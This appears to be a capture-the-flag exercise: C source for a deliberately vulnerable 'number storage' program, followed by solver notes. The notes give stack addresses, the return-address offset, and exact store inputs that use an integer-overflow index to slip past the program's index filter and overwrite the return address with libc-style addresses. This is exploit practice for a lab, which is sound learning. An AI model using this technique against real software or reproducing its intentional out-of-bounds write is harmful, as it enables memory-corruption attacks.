

unsigned int get_unum (void)
{
    unsigned int u = 0;

    scanf("%u", &u);

    return u;
}


int read_number(char *s)
{
    unsigned int i;
    
    printf(" Index: ");
    i = get_unum();

    printf(" Number at data[%u] is %u\n", i, s[i]);

    return 0;
}


int store_number(char *s)
{
    unsigned int n;
    unsigned int i;
    
    printf(" Number: ");
    n = get_unum();

    printf(" Index: ");
    i = get_unum();

    if ((i % 3 == 0) || (n >> 0x18 == 0xb7)) {
        puts(" *** ERROR! ***");
        puts("   This index is reserved for wil!");
        puts(" *** ERROR! ***");

        return 1;
    }

    s[i] = n;

    return 0;
}


void main(int argc, char **argv, char **envp)
{
    char buf [100];
    int ret;
    char cmd[20];

    memset(buf, 0, 100);

    for ( int i = 0 ; argv[i] ; i++ )
        memset(argv[i], 0, strlen(argv[i]));

    for ( int i = 0 ; envp[i] ; i++ )
        memset(envp[i], 0, strlen(envp[i]));

    puts("----------------------------------------------------");
    puts("  Welcome to wil\'s crappy number storage service!  ");
    puts("----------------------------------------------------");
    puts(" Commands:                                          ");
    puts("    store - store a number into the data storage    ");
    puts("    read  - read a number from the data storage     ");
    puts("    quit  - exit the program                        ");
    puts("----------------------------------------------------");
    puts("   wil has reserved some storage :>                 ");
    puts("----------------------------------------------------");

    while (1) {
        printf("Input command: ");

        fgets(&cmd, 20, stdin);

        // *(&ret + strlen(cmd) + 2) = 0; ??

        if (strncmp(cmd, "store", 5) == 0)
            ret = store_number(buf);
        else if (strncmp(cmd, "read", 4) == 0)
            ret = read_number(buf);
        else if (strncmp(cmd, "quit", 4) == 0)
            return 0;

        if (ret == 0)
            printf(" Completed %s command successfully\n", cmd);
        else
            printf(" Failed to do %s command\n", cmd);
    }
}

0x41414141 => 1094795585

0xf7f897ec => 4160264172

0xf7e6aed0 => 4159090384

buffer : 0xffffd544
eip : 0xffffd70c (buf[114]) => UNTARGETABLE BC 114 % 3 == 0
eip + 2 : 0xffffd714

WITH [./level07 a]
esp : 
ebp : same

116 w 4160264172
2147483762 w 4159090384